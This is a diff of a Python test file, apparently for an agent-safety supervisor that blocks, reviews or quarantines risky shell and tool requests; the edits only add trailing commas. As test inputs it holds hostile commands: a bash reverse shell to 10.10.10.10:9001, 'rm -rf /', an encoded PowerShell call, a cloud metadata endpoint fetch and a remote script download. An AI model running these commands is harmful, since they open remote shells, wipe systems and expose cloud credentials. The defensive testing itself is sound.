@@ -26,7 +26,7 @@ def test_supervisor_allows_safe_sandbox_execution() -> None:
             target="shell",
             command=["python", "-c", "print('safe')"],
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] in {"allow", "review", "approve"}
@@ -42,7 +42,7 @@ def test_supervisor_blocks_known_malicious_command() -> None:
             target="shell",
             command="bash -i >& /dev/tcp/10.10.10.10/9001 0>&1",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] in {"block", "quarantine"}
@@ -60,10 +60,10 @@ def test_supervisor_routes_blocked_runtime_to_incident_shape() -> None:
                         "block",
                         executed=False,
                         executionstate="denied",
-                    )
-                )
+                    ),
+                ),
             },
-        )()
+        )(),
     )
 
     result = supervisor.review_runtime_request(
@@ -72,7 +72,7 @@ def test_supervisor_routes_blocked_runtime_to_incident_shape() -> None:
             target="shell",
             command="powershell -enc bad",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "block"
@@ -91,10 +91,10 @@ def test_supervisor_preserves_executed_runtime_result() -> None:
                         "allow",
                         executed=True,
                         executionstate="executed",
-                    )
-                )
+                    ),
+                ),
             },
-        )()
+        )(),
     )
 
     result = supervisor.review_runtime_request(
@@ -103,7 +103,7 @@ def test_supervisor_preserves_executed_runtime_result() -> None:
             target="shell",
             command=["python", "-c", "print('ok')"],
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "allow"
@@ -121,7 +121,7 @@ def test_supervisor_reviews_high_risk_tool_call() -> None:
             target="runtime",
             command="bash -lc 'echo test'",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] in {"review", "block", "quarantine"}
@@ -139,7 +139,7 @@ def test_supervisor_blocks_metadata_tool_fetch() -> None:
             network_url="http://169.254.169.254/latest/meta-data/",
             network_method="GET",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] in {"block", "quarantine"}
@@ -185,8 +185,8 @@ def test_supervisor_marks_quarantine_for_quarantine_tool_verdict() -> None:
                             "artifactpolicies": [],
                         },
                     },
-                )()
-            )
+                )(),
+            ),
         },
     )()
 
@@ -199,7 +199,7 @@ def test_supervisor_marks_quarantine_for_quarantine_tool_verdict() -> None:
             target="runtime",
             command="rm -rf /",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "quarantine"
@@ -218,10 +218,10 @@ def test_supervisor_normalizes_missing_runtime_reasons() -> None:
                         "executed": False,
                         "executionstate": "pending_review",
                         "request": {"target": request.target},
-                    }
-                )
+                    },
+                ),
             },
-        )()
+        )(),
     )
 
     result = supervisor.review_runtime_request(
@@ -230,7 +230,7 @@ def test_supervisor_normalizes_missing_runtime_reasons() -> None:
             target="shell",
             command="curl https://example.com/script.sh",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "review"
@@ -276,8 +276,8 @@ def test_supervisor_normalizes_missing_toolcall_reasons() -> None:
                             "artifactpolicies": [],
                         },
                     },
-                )()
-            )
+                )(),
+            ),
         },
     )()
 
@@ -290,7 +290,7 @@ def test_supervisor_normalizes_missing_toolcall_reasons() -> None:
             target="runtime",
             command="echo hi",
             environment_scope="sandbox",
-        )
+        ),
     )
 
     assert result["decision"] == "review"
